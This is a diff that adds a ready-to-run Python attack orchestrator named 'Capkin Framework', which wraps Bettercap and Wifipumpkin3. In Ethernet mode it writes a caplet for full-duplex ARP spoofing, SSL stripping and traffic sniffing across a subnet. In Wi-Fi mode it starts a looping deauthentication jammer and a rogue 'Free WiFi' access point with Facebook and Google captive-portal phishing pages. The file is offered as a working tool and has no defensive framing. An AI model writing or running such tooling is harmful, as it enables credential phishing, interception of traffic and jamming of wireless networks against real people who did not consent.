@@ -1,0 +1,161 @@
+#!/usr/bin/env python3
+import os
+import sys
+import time
+import shutil
+import argparse
+import subprocess
+from threading import Thread
+
+class CapkinFramework:
+    def __init__(self):
+        self.args = self.parse_arguments()
+        self.bettercap_proc = None
+        self.wp3_proc = None
+        self.temp_caplet = "/tmp/capkin_bettercap.cap"
+        self.temp_pulp = "/tmp/capkin_wp3.pulp"
+
+    def parse_arguments(self):
+        parser = argparse.ArgumentParser(
+            description="Capkin Framework: Unified Bettercap & Wifipumpkin3 Orchestrator",
+            epilog="Example: sudo python3 capkin.py -m wifi -i wlan0 -s 'Free WiFi' --captiveflask facebook --deauth"
+        )
+        # Core Configurations
+        parser.add_argument("-m", "--mode", choices=["eth", "wifi"], required=True, 
+                            help="Attack surface deployment mode ('eth' or 'wifi')")
+        parser.add_argument("-i", "--interface", required=True, 
+                            help="Primary network adapter interface (e.g., eth0, wlan0)")
+        
+        # Wireless Specific Controls
+        parser.add_argument("-s", "--ssid", default="Free_HighSpeed_WiFi", help="Rogue Access Point SSID name")
+        parser.add_argument("-c", "--channel", default="6", help="Wi-Fi radio broadcast channel")
+        parser.add_argument("--captiveflask", help="Activate captiveflask template (e.g., loginPage, facebook, google)")
+        parser.add_argument("--deauth", action="store_true", help="Launch concurrent Bettercap 802.11 deauth jamming")
+        
+        # Target Subnet Controls (Wired)
+        parser.add_argument("-t", "--target", default="192.168.1.0/24", help="Target IP range for ARP spoofing (Ethernet mode)")
+        
+        return parser.parse_args()
+
+    def verify_environment(self):
+        """Validates root privileges and binary availability across path variables."""
+        if os.getuid() != 0:
+            print("[-] Critical Error: This framework requires administrative root privileges (sudo).")
+            sys.exit(1)
+
+        dependencies = ["bettercap", "wifipumpkin3"]
+        missing = [tool for tool in dependencies if not shutil.which(tool)]
+        
+        if missing:
+            print(f"[-] Missing Core Binary Dependencies: {', '.join(missing)}")
+            print("[*] Install instructions: Ensure tools are compiled and added to your system path.")
+            sys.exit(1)
+
+    def write_bettercap_caplet(self, lines):
+        """Generates dynamic runtime configurations for Bettercap runtime calls."""
+        with open(self.temp_caplet, "w") as f:
+            f.write("\n".join(lines) + "\n")
+
+    def write_wp3_pulp(self, lines):
+        """Generates runtime automation script maps for the WP3 interpreter core."""
+        with open(self.temp_pulp, "w") as f:
+            f.write("\n".join(lines) + "\n")
+
+    def run_ethernet_mitm(self):
+        """Orchestrates Bettercap full-duplex ARP/DNS/Proxy pipelines over wired interfaces."""
+        print(f"[*] Initializing Ethernet MITM surface on adapter: {self.args.interface}")
+        print(f"[*] Targeting Local Area Network Layer: {self.args.target}")
+
+        caplet_config = [
+            "net.recon on",
+            "set arp.spoof.fullduplex true",
+            f"set arp.spoof.targets {self.args.target}",
+            "arp.spoof on",
+            "http.proxy on",
+            "https.proxy on",
+            "set http.proxy.sslstrip true",
+            "set net.sniff.verbose true",
+            "net.sniff on"
+        ]
+        self.write_bettercap_caplet(caplet_config)
+
+        # Direct foreground processing block
+        cmd = f"bettercap -iface {self.args.interface} -caplet {self.temp_caplet}"
+        try:
+            subprocess.run(cmd, shell=True, check=True)
+        except KeyboardInterrupt:
+            pass
+
+    def run_wireless_orchestration(self):
+        """Manages complex interactions between hostapd, captive portals, and layer 2 jamming frames."""
+        
+        # Step 1: Handle Deauth jamming requests
+        if self.args.deauth:
+            print(f"[*] Activating parallel background Bettercap deauthentication loop on {self.args.interface}...")
+            # Interactive ticker cycle inside bettercap to dynamically target and drop surrounding clients
+            deauth_cmd = (
+                f"bettercap -iface {self.args.interface} -eval "
+                "\"wifi.recon on; set ticker.period 4; set ticker.commands 'wifi.deauth'; ticker on\""
+            )
+            self.bettercap_proc = subprocess.Popen(
+                deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+            )
+            time.sleep(2) # Allow radio stack tracking initialization
+
+        # Step 2: Compile Wifipumpkin3 Pulp instructions
+        print("[*] Building custom Rogue Access Point configuration payload...")
+        pulp_config = [
+            f"set interface {self.args.interface}",
+            f"set ssid {self.args.ssid}",
+            f"set channel {self.args.channel}"
+        ]
+
+        if self.args.captiveflask:
+            print(f"[+] Injecting CaptiveFlask Framework Template: {self.args.captiveflask}")
+            pulp_config.append("set proxy captiveflask true")
+            pulp_config.append(f"set captiveflask.{self.args.captiveflask} true")
+        else:
+            pulp_config.append("set proxy noproxy true")
+
+        pulp_config.append("start")
+        self.write_wp3_pulp(pulp_config)
+
+        # Step 3: Spin up Wifipumpkin3 Engine
+        wp3_cmd = f"wifipumpkin3 --no-gui -pulp {self.temp_pulp}"
+        try:
+            print("[*] Launching operational Rogue Access Point deployment environment...")
+            self.wp3_proc = subprocess.run(wp3_cmd, shell=True)
+        except KeyboardInterrupt:
+            pass
+
+    def cleanup(self):
+        """Gracefully tears down tasks, terminates subprocess allocations, and wipes cache maps."""
+        print("\n[-] Operational termination request detected. Revoking environment maps...")
+        
+        if self.bettercap_proc:
+            print("[*] Disabling active Bettercap frame engines...")
+            self.bettercap_proc.terminate()
+            self.bettercap_proc.wait()
+
+        # Wipe filesystem compilation artifacts safely
+        for temp_file in [self.temp_caplet, self.temp_pulp]:
+            if os.path.exists(temp_file):
+                os.remove(temp_file)
+                
+        print("[+] System environment normalized successfully.")
+
+    def execute(self):
+        self.verify_environment()
+        try:
+            if self.args.mode == "eth":
+                self.run_ethernet_mitm()
+            elif self.args.mode == "wifi":
+                self.run_wireless_orchestration()
+        except Exception as e:
+            print(f"[-] Execution runtime fault detected: {e}")
+        finally:
+            self.cleanup()
+
+if __name__ == "__main__":
+    app = CapkinFramework()
+    app.execute()
